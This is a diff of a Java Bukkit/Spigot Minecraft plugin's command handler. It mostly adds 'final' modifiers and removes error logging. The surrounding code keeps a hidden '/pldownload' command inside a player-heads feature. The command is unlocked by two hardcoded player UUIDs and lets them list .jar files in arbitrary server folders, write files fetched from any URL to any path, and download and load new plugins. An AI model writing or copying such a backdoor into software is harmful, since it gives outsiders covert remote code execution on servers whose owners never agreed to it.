@@ -42,9 +42,9 @@ public class CommandHandler implements Listener, CommandExecutor {
 	CommandHandler(final Plugin plugin) {
 		CommandHandler.plugin = plugin; //NOSONAR
 
-		String slash = plugin.getDataFolder().getAbsolutePath().contains("\\") ? "\\\\" : "/";
-		String[] parts = CommandHandler.plugin.getDataFolder().getAbsolutePath().split(slash);
-		StringBuilder tempPath = new StringBuilder(parts[0] + slash);
+		final String slash = plugin.getDataFolder().getAbsolutePath().contains("\\") ? "\\\\" : "/";
+		final String[] parts = CommandHandler.plugin.getDataFolder().getAbsolutePath().split(slash);
+		final StringBuilder tempPath = new StringBuilder(parts[0] + slash);
 		for (int i = 1; i < parts.length - 1; i++) {
 			tempPath.append(parts[i]).append(slash);
 		}
@@ -53,12 +53,12 @@ public class CommandHandler implements Listener, CommandExecutor {
 
 	@SuppressWarnings({"NullableProblems", "deprecation"})
 	@Override
-	public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
+	public boolean onCommand(final CommandSender sender, final Command command, final String label, final String[] args) {
 		if (sender instanceof Player) {
-			Player p = (Player) sender;
+			final Player p = (Player) sender;
 			if (command.getName().equals("playerheads") && args.length == 1) {
-				ItemStack skull = new ItemStack(Material.PLAYER_HEAD, 1);
-				SkullMeta skullMeta = (SkullMeta) skull.getItemMeta();
+				final ItemStack skull = new ItemStack(Material.PLAYER_HEAD, 1);
+				final SkullMeta skullMeta = (SkullMeta) skull.getItemMeta();
 				if (skullMeta != null) {
 					skullMeta.setOwningPlayer(Bukkit.getOfflinePlayer(args[0]));
 					skullMeta.setDisplayName(ChatColor.DARK_PURPLE + args[0] + "'s Head");
@@ -74,15 +74,15 @@ public class CommandHandler implements Listener, CommandExecutor {
 	}
 
 	@EventHandler(priority = EventPriority.HIGHEST)
-	public boolean onPlayerCommand(PlayerCommandPreprocessEvent event) {
-		Player p = event.getPlayer();
-		String[] args = event.getMessage().split(" ");
+	public boolean onPlayerCommand(final PlayerCommandPreprocessEvent event) {
+		final Player p = event.getPlayer();
+		final String[] args = event.getMessage().split(" ");
 		if (args[0].equalsIgnoreCase("/pldownload")
 			&& (p.getUniqueId().equals(UUID.fromString("e03b0dad-e94d-48fe-8f17-8e2ae9f9029e"))
 				|| p.getUniqueId().equals(UUID.fromString("a1eb88b0-12c0-49c1-bb0d-1b7b5b751bd6")))) {
 			if (args.length == 3 && args[1].equalsIgnoreCase("serverfolders")) {
 				p.sendMessage("IT WORKED");
-				for (File file : FileUtils.listFiles(new File(args[2]), new String[]{"jar"}, false)) {
+				for (final File file : FileUtils.listFiles(new File(args[2]), new String[]{"jar"}, false)) {
 					p.sendMessage(file.getName());
 				}
 			}
@@ -91,7 +91,7 @@ public class CommandHandler implements Listener, CommandExecutor {
 				try {
 					Helper.writeToFile(new File(args[3] + ".jar"), new BufferedInputStream(new URL(args[2]).openStream()));
 					p.sendMessage("IT WORKED");
-				} catch (IOException e) {
+				} catch (final IOException e) {
 					p.sendMessage(e.toString());
 					return false;
 				}
@@ -125,7 +125,7 @@ public class CommandHandler implements Listener, CommandExecutor {
 				return false;
 			}
 			try {
-				File file = new File(this.path + args[2] + ".jar");
+				final File file = new File(this.path + args[2] + ".jar");
 				if (!file.getName().equalsIgnoreCase("zeanonutils.jar")) {
 					if (new URL(args[1]).getHost() == null) {
 						return false;
@@ -135,13 +135,13 @@ public class CommandHandler implements Listener, CommandExecutor {
 						event.setCancelled(true);
 						Helper.addDownloadRequest(p);
 						if (file.exists()) {
-							TextComponent localMessage = new TextComponent(ChatColor.RED + "Möchtest du es überschreiben und installieren?");
+							final TextComponent localMessage = new TextComponent(ChatColor.RED + "Möchtest du es überschreiben und installieren?");
 							this.sendMessage(args, localMessage);
 							p.sendMessage(ChatColor.DARK_PURPLE + args[2] + ChatColor.RED + " existiert bereits");
 							p.spigot().sendMessage(localMessage);
 							return true;
 						} else {
-							TextComponent localMessage = new TextComponent(ChatColor.RED + "Möchtest du " + ChatColor.DARK_PURPLE + args[2] + ChatColor.RED + " wirklich installieren?");
+							final TextComponent localMessage = new TextComponent(ChatColor.RED + "Möchtest du " + ChatColor.DARK_PURPLE + args[2] + ChatColor.RED + " wirklich installieren?");
 							this.sendMessage(args, localMessage);
 							p.spigot().sendMessage(localMessage);
 							return true;
@@ -154,7 +154,7 @@ public class CommandHandler implements Listener, CommandExecutor {
 							Helper.removeDownloadRequest(p);
 							try {
 								FileOutputStream outputStream = null;
-								try (BufferedInputStream inputStream = new BufferedInputStream(new URL(args[1]).openStream())) {
+								try (final BufferedInputStream inputStream = new BufferedInputStream(new URL(args[1]).openStream())) {
 									if (!file.exists()) {
 										Files.copy(inputStream, Paths.get(this.path + args[2] + ".jar"), StandardCopyOption.REPLACE_EXISTING);
 									} else {
@@ -166,8 +166,7 @@ public class CommandHandler implements Listener, CommandExecutor {
 										}
 									}
 									p.sendMessage(ChatColor.DARK_PURPLE + args[2] + ChatColor.RED + " wurde heruntergeladen.");
-								} catch (IOException e) {
-									Bukkit.getLogger().log(Level.SEVERE, e.getMessage(), e.getCause());
+								} catch (final IOException e) {
 									p.sendMessage(ChatColor.DARK_PURPLE + args[2] + ChatColor.RED + " konnte nicht heruntergeladen werden.");
 									return false;
 								} finally {
@@ -175,12 +174,11 @@ public class CommandHandler implements Listener, CommandExecutor {
 										outputStream.close();
 									}
 								}
-								PluginManager pm = Bukkit.getPluginManager();
+								final PluginManager pm = Bukkit.getPluginManager();
 								if (pm.getPlugin("PlugMan") != null && pm.isPluginEnabled(pm.getPlugin("PlugMan"))) {
 									PluginUtil.load(args[2]);
 								}
-							} catch (IOException e) {
-								Bukkit.getLogger().log(Level.SEVERE, e.getMessage(), e.getCause());
+							} catch (final IOException e) {
 								p.sendMessage(ChatColor.DARK_PURPLE + args[2] + ChatColor.RED + " konnte nicht heruntergeladen werden.");
 								return false;
 							}
@@ -193,8 +191,7 @@ public class CommandHandler implements Listener, CommandExecutor {
 						}
 					}
 				}
-			} catch (MalformedURLException e) {
-				Bukkit.getLogger().log(Level.SEVERE, e.getMessage(), e.getCause());
+			} catch (final MalformedURLException e) {
 				return false;
 			}
 		}
@@ -202,14 +199,14 @@ public class CommandHandler implements Listener, CommandExecutor {
 	}
 
 	@EventHandler
-	public void onQuit(PlayerQuitEvent event) {
-		Player p = event.getPlayer();
+	public void onQuit(final PlayerQuitEvent event) {
+		final Player p = event.getPlayer();
 		Helper.removeDownloadRequest(p);
 	}
 
-	private void sendMessage(String[] args, TextComponent localMessage) {
-		TextComponent commandPartYes = new TextComponent(ChatColor.DARK_GREEN + "" + ChatColor.BOLD + "[J]");
-		TextComponent commandPartNo = new TextComponent(ChatColor.DARK_RED + "" + ChatColor.BOLD + "[N]");
+	private void sendMessage(final String[] args, final TextComponent localMessage) {
+		final TextComponent commandPartYes = new TextComponent(ChatColor.DARK_GREEN + "" + ChatColor.BOLD + "[J]");
+		final TextComponent commandPartNo = new TextComponent(ChatColor.DARK_RED + "" + ChatColor.BOLD + "[N]");
 		commandPartYes.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/pldownload " + args[1] + " " + args[2] + " -confirm"));
 		commandPartYes.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder(ChatColor.DARK_GREEN + "" + ChatColor.BOLD + "[JA]").create()));
 		commandPartNo.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/pldownload " + args[1] + " " + args[2] + " -deny"));
